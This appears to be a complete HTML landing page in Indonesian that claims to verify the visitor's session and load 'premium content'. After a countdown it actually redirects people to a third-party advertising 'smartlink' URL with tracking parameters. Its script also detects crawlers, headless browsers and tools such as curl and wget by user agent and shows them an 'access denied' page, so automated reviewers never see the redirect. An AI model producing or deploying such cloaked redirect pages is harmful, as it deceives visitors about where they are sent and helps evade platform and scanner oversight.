<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loader-container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .countdown {
            font-size: 48px;
            font-weight: bold;
            color: #3498db;
            margin: 20px 0;
        }
        .button {
            display: inline-block;
            padding: 15px 30px;
            background: #3498db;
            color: white;
            text-decoration: none;
            border-radius: 10px;
            font-weight: bold;
            margin-top: 20px;
            border: none;
            cursor: pointer;
            transition: background 0.3s;
            width: 100%;
            font-size: 16px;
        }
        .button:hover {
            background: #2980b9;
        }
        .button:disabled {
            background: #bdc3c7;
            cursor: not-allowed;
        }
        .note {
            margin-top: 20px;
            color: #7f8c8d;
            font-size: 12px;
        }
        .user-agent {
            background: #ecf0f1;
            padding: 10px;
            border-radius: 5px;
            font-size: 10px;
            word-break: break-all;
            margin-top: 20px;
            color: #34495e;
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <h2>⏳ Mempersiapkan Konten Premium</h2>
        <div class="spinner" id="spinner"></div>
        <div class="countdown" id="countdown">3</div>
        <p>Harap tunggu, kami sedang memverifikasi sesi Anda...</p>
        
        <button class="button" id="continueBtn" disabled>
            🔒 Tombol akan aktif dalam 3 detik
        </button>
        
        <div class="note">
            ⚡ Traffic Filter Active | GitHub Pages Test
        </div>
        
        <div class="user-agent" id="uaDisplay"></div>
    </div>

    <script>
        // =============== KONFIGURASI ===============
        const SMARTLINK_URL = "https://oversightexcitement.com/waj01tcu?key=dad6d89994c5673e298839c6d3cb0e9b"; // GANTI DENGAN URL ANDA
        
        // Daftar bot yang akan diblokir
        const BOTS = ['bot', 'spider', 'crawler', 'python', 'curl', 'wget', 'headless'];
        // ===========================================

        // Tampilkan User-Agent
        const ua = navigator.userAgent;
        document.getElementById('uaDisplay').textContent = 'UA: ' + ua.substring(0, 50) + '...';
        
        // Cek apakah bot
        const isBot = BOTS.some(bot => ua.toLowerCase().includes(bot));
        
        if (isBot) {
            document.body.innerHTML = `
                <div style="text-align: center; padding: 50px; background: white; border-radius: 10px; max-width: 400px; margin: 50px auto;">
                    <h2 style="color: #e74c3c;">⛔ Akses Ditolak</h2>
                    <p>Bot terdeteksi dalam sistem kami.</p>
                </div>
            `;
        } else {
            // Countdown
            let timeLeft = 3;
            const countdownEl = document.getElementById('countdown');
            const btn = document.getElementById('continueBtn');
            const spinner = document.getElementById('spinner');
            
            const timer = setInterval(() => {
                timeLeft--;
                countdownEl.textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownEl.textContent = '✓';
                    spinner.style.display = 'none';
                    btn.disabled = false;
                    btn.innerHTML = '🚀 Lanjut ke Konten Premium';
                    
                    // Event klik
                    btn.onclick = function() {
                        // Redirect dengan UTM
                        const finalUrl = SMARTLINK_URL.includes('?') 
                            ? SMARTLINK_URL + '&utm_source=github_loader&utm_medium=simple_test&utm_campaign=' + Date.now()
                            : SMARTLINK_URL + '?utm_source=github_loader&utm_medium=simple_test&utm_campaign=' + Date.now();
                        
                        window.location.href = finalUrl;
                    };
                }
            }, 1000);
        }
    </script>
</body>
</html>
